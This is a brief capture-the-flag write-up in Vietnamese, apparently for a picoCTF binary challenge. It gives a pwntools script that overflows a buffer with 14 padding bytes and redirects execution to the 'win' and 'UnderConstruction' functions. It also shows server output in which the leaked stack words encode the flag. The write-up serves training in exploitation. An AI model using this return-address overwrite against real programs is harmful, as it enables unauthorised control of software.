# Ý tưởng
ta thấy hàm UnderConstruction() có dùng FMT để leak, và hàm win để cat flag
ở đây ta sẽ nhảy vào hàm win trước và sau đó nhảy vào under để leak dữ liệu trong stack
```python3
from pwn import *
r = remote('saturn.picoctf.net', 51893)
elf = ELF("./vuln")
payload = b"a"*14 + p32(elf.symbols['win']) + p32(elf.symbols['UnderConstruction'])
r.sendlineafter("Give me a string that gets you the flag\n", payload)
r.interactive()
```
chạy netcat ta nhận được
```
aaaaaaaaaaaaaa\xa0\x9d\x04 \x9e\x04
User information : 0x80c9a04 0x804007d 0x39623938 0x30356438 0x5f597230 0x6d334d5f
Names of user: 0x50755f4e 0x34656c43 0x7b465443
Age of user: 0x6f636970
```
do ở đây ta dùng tool để swap